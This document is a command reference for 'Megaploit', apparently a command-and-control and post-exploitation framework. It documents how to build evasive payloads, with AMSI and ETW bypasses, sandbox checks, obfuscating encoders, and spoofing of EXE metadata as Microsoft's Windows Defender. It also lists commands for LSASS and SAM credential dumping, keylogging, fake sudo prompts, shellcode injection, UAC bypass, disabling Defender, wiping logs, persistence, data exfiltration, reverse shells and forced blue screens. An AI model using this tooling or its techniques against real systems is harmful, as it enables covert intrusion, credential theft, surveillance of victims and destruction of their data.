# Megaploit CLI Reference

Complete reference for all commands available in the Megaploit console.

---

## Global Context (`megaploit [N] »`)

### Connection & Sessions

| Command | Description |
|---|---|
| `sessions` | List all active sessions with ID, IP:Port, OS, hostname, username, tag, uptime |
| `use <session_id>` | Enter session interaction loop for session `<id>` |
| `use <module/path>` | Load a module (e.g. `use auxiliary/scanner/tcp_port`) |
| `broadcast <cmd>` | Run a shell command on ALL active sessions simultaneously |

### Configuration

| Command | Description |
|---|---|
| `set lhost <ip>` | Callback IP for agents |
| `set port <port>` | Callback port |
| `set cert <file>` | TLS certificate PEM file |
| `set key <file>` | TLS private key PEM file |
| `set auto_update on\|off` | Toggle background tool auto-update |

### TLS

| Command | Description |
|---|---|
| `tls auto` | Auto-generate a self-signed cert (`loot/tls/`) and enable TLS immediately. Requires `cryptography` pip package or `openssl` on PATH. SHA-256 fingerprint printed. |
| `tls regen` | Force-regenerate the auto-cert even if one already exists |
| `tls status` | Show current TLS mode (auto/manual/disabled), cert path, and SHA-256 fingerprint |

You can also start the server with `--tls` to auto-generate on launch:

```bash
python3 server.py -lh 10.0.0.1 -p 4444 --tls
```

### Agent Generation

| Command | Description |
|---|---|
| `generate` | Patch `connection.py` with current LHOST/PORT |
| `generate --tls` | Patch with TLS enabled (auto-generates server cert if none configured) |
| `generate -c` | Patch + byte-compile `agent.py` |

### Module System

| Command | Description |
|---|---|
| `show modules` | Display all loaded modules |
| `show modules <query>` | Search modules by name/description |
| `use <module/path>` | Load and display module options |
| `setopt <OPT> <val>` | Set option on active module |
| `setoption <OPT> <val>` | Alias for `setopt` |
| `options` | Print active module options table |
| `run` | Execute active module (Ctrl-C to interrupt) |
| `check` | Run module pre-flight check (no state change) |
| `info` | Show info for active module |
| `info <module/path>` | Show info for named module |
| `back` | Clear active module (return to global context) |

### Payload Builder

```
payload <format> [options]

Formats:
  py            Pure Python source agent
  ps1           PowerShell dropper (AMSI bypass + ETW patch + sandbox check baked in)
  hta           HTML Application dropper (VBScript sandbox checks)
  vba           VBA macro dropper (sandbox checks + Application.Wait)
  sh            Bash/sh dropper (nproc/df/uptime sandbox checks)
  bat           Windows batch dropper (inline AMSI/ETW bypass via PowerShell)
  raw           Same as py (for piping)
  exe           PyInstaller Windows EXE (requires pyinstaller; supports PE metadata spoofing)
  elf           PyInstaller Linux ELF (requires pyinstaller)
  go_exe        Go agent compiled for Windows (requires go)  <- NEW v3
  go_elf        Go agent compiled for Linux/macOS (requires go)  <- NEW v3
  oneliner_py   Single Python one-liner (gzip+base64)
  oneliner_ps1  Single PowerShell one-liner (inline AMSI + ETW bypass)
  py_stealth    ctypes-only agent -- no subprocess/socket at top level (AV-friendly)  <- NEW v4

Options:
  --out <file>          Write to file instead of printing
  --tls                 Agent uses TLS
  --encoder <name>      Apply encoder (can be repeated)
  --upx                 UPX-pack binary (exe/elf only; requires upx on PATH)
  --sleep <secs>        Sleep N seconds before connecting (sandbox evasion)
  --pe-company <name>   EXE/ELF PE metadata: company name  (exe/elf only)
  --pe-product <name>   EXE/ELF PE metadata: product name  (exe/elf only)
  --pe-version <ver>    EXE/ELF PE metadata: version string (exe/elf only)
  --pe-copyright <str>  EXE/ELF PE metadata: copyright string (exe/elf only)

Encoders:
  xor_rolling     XOR with rolling 32-byte key (key prepended to output)
  rc4             RC4 stream cipher (16-byte key prepended)
  b64gzip         Gzip compress -> base64 encode
  rev             Reverse byte sequence
  zlib_b64        Zlib compress -> base64 encode
  rot13_src       ROT-13 printable ASCII chars
  null_pad        Insert null byte after every real byte
  comment_spam    Insert random inline comments (~40% of lines)
  varname_rand    Randomise short Python variable names
  ps1_concat      PowerShell string concat obfuscation
  sandbox_detect  Prepend Python sandbox guard (CPU/disk/uptime/hostname/debugger/mouse)  <- NEW v4
  etw_patch       Prepend Python ETW patcher (VirtualProtect -> 0xC3 RET stub)  <- NEW v4

Examples:
  payload ps1 --out agent.ps1
  payload exe --out agent.exe --upx
  payload exe --out agent.exe --pe-company "Microsoft" --pe-product "Windows Defender"
  payload go_exe --out agent.exe
  payload go_elf --out agent_linux
  payload py --encoder comment_spam --encoder varname_rand --out obf.py
  payload py --encoder sandbox_detect --encoder etw_patch --out hardened.py
  payload py_stealth --out stealth_agent.py
  payload oneliner_py
  payload ps1 --sleep 30 --out agent.ps1
```

### Staged Delivery — NEW v3

```
stage0 generate [--minimal] [--out <file>] [--port N] [--start]
stage0 status
stage0 stop

Options:
  --minimal      Compact single-file dropper (no threading, shorter names)
  --out / -o     Write to file (default: print to terminal)
  --port / -p    Staging server port (default: main_port + 1)
  --start        Also launch StagingServer in background

Examples:
  stage0 generate --out dropper.py
  stage0 generate --minimal --out macro_dropper.py
  stage0 generate --start                          # generate + launch server
  stage0 generate --start --port 4445 --out d.py
  stage0 status
  stage0 stop
```

### Post-Exploitation Pipeline — NEW v3

```
pipeline status        Show active + available profiles
pipeline list          List all profiles with status indicators
pipeline enable <p>    Enable a profile (active on next session)
pipeline disable <p>   Disable a profile
pipeline reload        Reload AutoRunScript config from disk

Profiles:
  basic     sysinfo, whoami, pwd, env
  creds     hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault
  recon     ps, installed_software, scheduled_tasks, users, os_info
  network   arp, netstat, ifconfig, hosts_file
  full      All of the above

Examples:
  pipeline enable creds
  pipeline enable full
  pipeline disable creds
  pipeline status
```

### Operations

| Command | Description |
|---|---|
| `jobs list` | List background jobs (ID, name, status, started) |
| `jobs kill <id>` | Send stop signal to a job |
| `creds show` | Display credential store |
| `creds search <query>` | Search credentials by host/username/type |
| `creds export <file>` | Export credentials to JSON file |
| `creds clear` | Clear all credentials (requires YES confirmation) |
| `report html [output]` | Generate HTML engagement report |
| `report json [output]` | Generate JSON engagement report |

### AutoRunScript

| Command | Description |
|---|---|
| `autorun show` | Display current AutoRunScript config |
| `autorun reload` | Reload config from `~/.megaploit_autorun.json` |
| `autorun save-default` | Write starter template to config file |
| `autorun test <session_id>` | Preview which commands would run for a session |

### Web Dashboard

| Command | Description |
|---|---|
| `web start` | Start Flask dashboard on `127.0.0.1:8080` |
| `web start --port N` | Start on custom port |
| `web start --host H` | Bind to custom host |
| `web stop` | Stop the dashboard |
| `web status` | Check if dashboard is running |

### Multi-Operator RPC

| Command | Description |
|---|---|
| `rpc start` | Start JSON-RPC server on `127.0.0.1:7777` |
| `rpc start --port N` | Start on custom port |
| `rpc stop` | Stop RPC server |
| `rpc status` | Check if running + connected operator count |
| `rpc operators` | List connected operators |

### Toolbox

```
toolbox install <url> <name> [desc] [--tags t1,t2]
toolbox catalogue [query]           Browse 203-tool catalogue
toolbox catalogue install <name>    Install from catalogue
toolbox list                        List installed tools
toolbox search <query>              Search by name/tag/description
toolbox info <name>                 Show tool details
toolbox update <name>               Pull latest + rebuild
toolbox update-all                  Update all installed tools
toolbox check-updates               Check for updates without applying
toolbox rebuild <name>              Re-build without git pull
toolbox remove <name>               Uninstall
toolbox set-entry <name> <path>     Override entry-point
toolbox healthcheck [name]          Verify tool is runnable
toolbox dockerfile <name>           Generate Dockerfile
toolbox audit <name>                Security audit
toolbox plan <name|url>             Dry-run install plan
toolbox workspace list              List named workspaces
toolbox workspace new <name>        Create new workspace
toolbox workspace install-all <ws>  Install all tools in workspace
toolbox workspace export <ws>       Export workspace to JSON
toolbox config <name>               Show per-tool runtime config
toolbox config <name> set <k> <v>   Set config value
```

### Plugins

| Command | Description |
|---|---|
| `plugins` / `plugins list` | List all loaded plugins |
| `plugins reload` | Re-scan `plugins/` directory |
| `plugins info <name>` | Full plugin details |
| `plugins enable <name>` | Enable a disabled plugin |
| `plugins disable <name>` | Disable a plugin (persisted) |
| `plugins load <path\|url>` | Load from file path or URL |
| `plugins watcher on\|off` | Toggle hot-reload file watcher |
| `plugins deps install` | pip-install missing plugin dependencies |

#### C-remote-shell Plugin (`c-remote-shell`)

Bundled first-party plugin for the [`C-remote-shell`](https://github.com/Levon-Volodin/C-remote-shell) Windows C agent submodule.

| Command | Args | Description |
|---|---|---|
| `crs_build` | `[lhost] [port]` | Compile `megaploit_c_agent.exe` — auto-detects MinGW / MSVC; bakes LHOST+PORT in at compile time |
| `crs_probe` | — | Run the 46-signal C2 compliance report on the C-remote-shell source tree |
| `crs_verbs` | — | List every wire verb the C agent dispatches; marks C-exclusive ones |
| `crs_payload_info` | — | Print the exact MinGW command line for current LHOST/PORT |
| `forceOff` ⚠ | — | Send `forceOff()` to the active C session — force power-off via `NtSetSystemPowerState` |
| `blueScreen` ⚠ | — | Send `blueScreen()` to the active C session — BSOD via `NtRaiseHardError` |

> **Requirements:** MinGW (`apt install mingw-w64`) for Linux/macOS builds, or MSVC Developer Command Prompt on Windows.
> `forceOff` and `blueScreen` require a **C-remote-shell** session (not a Python agent session) and prompt for `YES` confirmation.

### Engagement & Operations

| Command | Description |
|---|---|
| `engagement name <n>` | Set engagement name |
| `engagement desc <d>` | Set engagement description |
| `engagement show` | Display current engagement info |
| `loot browse` | Browse loot directory tree |
| `loot export <dir>` | Export loot to directory |
| `loot clear` | Clear loot (requires YES) |
| `history [N]` | Show last N commands (default 20) |
| `history search <query>` | Search command history |
| `history clear` | Clear history |
| `alias <name> <cmd>` | Create command alias |
| `unalias <name>` | Remove alias |
| `aliases` | List all aliases |
| `env_probe [name]` | Probe operator toolchain |
| `workspace <sub>` | Named tool groups |
| `whatsnew` / `changelog` | Show version changelog |
| `clear` | Clear terminal |
| `exit` | Shutdown and exit |

---

## Session Context (`megaploit session(N) »`)

### Filesystem

| Command | Usage | Description |
|---|---|---|
| `ls` | `ls [path]` | List directory (default: cwd) |
| `cat` | `cat <file>` | Read file contents |
| `find_files` | `find_files <path> <pattern>` | Recursive file search |
| `find_writable` | `find_writable [path]` | World-writable files |
| `find_suid` | `find_suid [path]` | SUID binaries |
| `file_hash` | `file_hash <file>` | SHA-256 hash |
| `tail` | `tail <file> [n]` | Last N lines |
| `write_file` | `write_file <file> <content>` | Write to file |
| `mkdir` | `mkdir <path>` | Create directory |
| `rm` | `rm <path>` | Remove file/directory |
| `chmod` | `chmod <mode> <path>` | Change permissions |
| `cd` | `cd <dir>` | Change working directory |
| `search` | `search <path> <keyword>` | Recursive grep |
| `upload` | `upload <local_file>` | Push file to target |
| `download` | `download <remote_file>` | Pull file to loot |
| `zip_download` | `zip_download <path>` | Zip + pull |

### Process & System

| Command | Description |
|---|---|
| `sysinfo` | Full system information |
| `ps` | Process list |
| `kill <pid>` | Kill process |
| `netstat` | Active connections |
| `arp` | ARP table |
| `routes` | Routing table |
| `ifconfig` | Network interfaces |
| `env` | Environment variables |
| `installed_software` | Installed applications |
| `active_windows` | Open window titles |
| `scheduled_tasks` | Scheduled tasks / cron |
| `services` | Running services |
| `users` | User accounts |
| `logged_in` | Logged-in users |
| `startup_items` | Startup programs |
| `os_info` | Detailed OS info |
| `dns_query <host>` | DNS lookup from target |

### Screen & Media

| Command | Usage | Description |
|---|---|---|
| `screenshot` | `screenshot` | JPEG screenshot |
| `screenshot_timelapse` | `screenshot_timelapse <n> <interval>` | N frames |
| `screenshot_region` | `screenshot_region <x> <y> <w> <h>` | Region capture |
| `screenrecord` | `screenrecord <secs> [fps] [width]` | MP4 recording |
| `record` | `record <secs>` | Microphone WAV |
| `mic_level` | `mic_level` | Peak dB |
| `screen_stream` | `screen_stream on\|off` | MJPEG :5000 |
| `webcam` | `webcam on\|off` | MJPEG :5001 |

### GUI & Interaction

| Command | Usage | Description |
|---|---|---|
| `msgbox` | `msgbox <title> <msg>` | Dialog box |
| `mouse_move` | `mouse_move <x> <y> [click]` | Move/click mouse |
| `type_keys` | `type_keys text <text>` | Input text or hotkey |
| `notify` | `notify <title> <msg>` | OS notification |
| `open_url` | `open_url <url>` | Open in browser |
| `play_sound` | `play_sound <file>` | Play audio |
| `set_wallpaper` | `set_wallpaper <file>` | Set wallpaper |
| `clip_watch` | `clip_watch` | Monitor clipboard |
| `lock_screen` | `lock_screen` | Lock workstation |
| `idle_time` | `idle_time` | Seconds idle |

### Credentials

| Command | Description |
|---|---|
| `hashdump` | `/etc/shadow` or SAM+SYSTEM dump |
| `browser_creds [cookies\|passwords\|all]` | Browser credential extraction |
| `browser_history [n]` | Browser visit history |
| `wifi_passwords` | Saved Wi-Fi credentials |
| `cred_vault` | Windows Credential Manager |
| `ssh_harvest` | SSH keys and history |
| `sudo_sniff [path]` | Fake sudo password capture |
| `whoami_priv` | Token privileges |

### Kiwi — Native C Credential Dumper

Kiwi is a compiled C binary (`megaploit_kiwi.exe`) that runs on the Windows target. It is compiled from source on first use (requires MinGW-w64 `gcc` or MSVC `cl.exe`).

| Command | Dangerous | Description |
|---|---|---|
| `kiwi logonpasswords` | ✓ | LSASS ReadProcessMemory — NTLM hashes + SHA1. Needs SYSTEM or SeDebugPrivilege. |
| `kiwi sam` | ✓ | SAM hive offline dump via `RegSaveKey`. Needs backup privilege / SYSTEM. |
| `kiwi lsa` | ✓ | LSA secrets from `SECURITY\Policy\Secrets`. Needs SYSTEM. |
| `kiwi credman` | | Windows Credential Manager via `CredEnumerateW`. Current user. |
| `kiwi tickets` | | Kerberos TGT/TGS cache via `LsaCallAuthenticationPackage`. |
| `kiwi wdigest` | | Set `UseLogonCredential=1` — cleartext cached on next logon. Needs admin. |
| `kiwi dpapi` | | DPAPI masterkey GUID enumeration for all user profiles. |
| `kiwi all` | ✓ | Run every module in sequence. |

> **Tip:** Run `getsystem` first to escalate to SYSTEM, then use `kiwi logonpasswords` / `kiwi sam` / `kiwi lsa`.

### Privilege Escalation & Evasion

| Command | Dangerous | Description |
|---|---|---|
| `make_token <user> <pass>` | | Impersonate user |
| `rev2self` | | Revert token |
| `getsystem` | ✓ | 3-technique cascade: named-pipe impersonation → SeDebugPrivilege token steal → unquoted service path discovery |
| `uac_bypass <cmd>` | ✓ | fodhelper registry hijack UAC bypass (Windows 10/11) |
| `token_steal [pid]` | ✓ | SeDebugPrivilege + DuplicateToken impersonation |
| `inject_shellcode <pid> <hex>` | ✓ | Shellcode injection via WriteProcessMemory + CreateRemoteThread |
| `dll_inject <pid> <dll>` | ✓ | LoadLibraryA remote thread DLL injection |
| `living_off_land <lolbin> <args>` | | Signed Windows LOLBin execution |
| `patch_amsi` | | Byte-patch AmsiScanBuffer (VirtualProtect + memmove) |
| `disable_defender` | | Disable Windows Defender via registry + service |
| `hide_file <file>` | | Set FILE_ATTRIBUTE_HIDDEN |
| `timestomp <file> <ref>` | | Copy timestamps from reference file (Windows FILETIME + utime) |
| `clear_logs` | | Wipe Windows event logs or Linux syslog/auth.log |
| `self_destruct` | ✓ | Remove persistence registry key, delete EXE, exit |
| `etw_patch` | | Live in-process ETW patch — VirtualProtect `EtwEventWrite` → `0xC3` RET stub (Windows only) ← NEW v4 |
| `sandbox_check` | | Diagnostic report of all sandbox/VM indicators: CPU count, disk size, uptime, hostname pattern, debugger, mouse movement (Windows-aware) ← NEW v4 |

### Keylogger

| Command | Description |
|---|---|
| `keylog_start` | Start keystroke logger |
| `keylog_dump` | Read captured keystrokes |
| `keylog_stop` | Stop and clean up |

### Persistence

| Command | Description |
|---|---|
| `persist <name> <file>` | Windows Run-key persistence |

### Pivoting & Networking

| Command | Description |
|---|---|
| `portfwd <lport> <rhost> <rport>` | TCP relay in background thread |
| `socks5 [port]` | RFC-1928 SOCKS5 proxy (port default 1080) |
| `ping_sweep <cidr>` | ICMP ping sweep |
| `smb_shares <host>` | SMB share enumeration |
| `ssh_connect <host> <port> <user> <pass>` | SSH connect |
| `rdp_enable` | Enable Remote Desktop |
| `exfil_dns <data> <domain>` | DNS exfiltration |
| `exfil_http <url> <file>` | HTTP exfiltration |
| `reverse_shell <ip> <port>` | ✓ PTY reverse shell |

### Toolbox (In-Session)

| Command | Description |
|---|---|
| `toolbox_run <name> [args]` | Run tool locally against session IP |
| `toolbox_deploy <name> [args]` | Upload + run tool on target |

---

## Module Context Options Table

```
  Option    Type     Value         Req  Description
  ──────────────────────────────────────────────────────
  RHOSTS    string   (not set)     yes  Target IP or CIDR
  PORTS     string   21-23,80...   yes  Ports to scan
  THREADS   integer  100           no   Concurrent threads
  TIMEOUT   integer  2             no   Connect timeout
  VERBOSE   boolean  False         no   Print closed ports
```

Option types: `string`, `integer`, `boolean`, `address`, `cidr`, `port`, `enum`

---

## Tab Completion

Tab completion (via `readline`) is available for:
- All global commands including `pipeline`, `stage0`
- All session commands
- `use <tab>` → completes module names
- `toolbox_run <tab>` → completes installed tool names
- Plugin command names
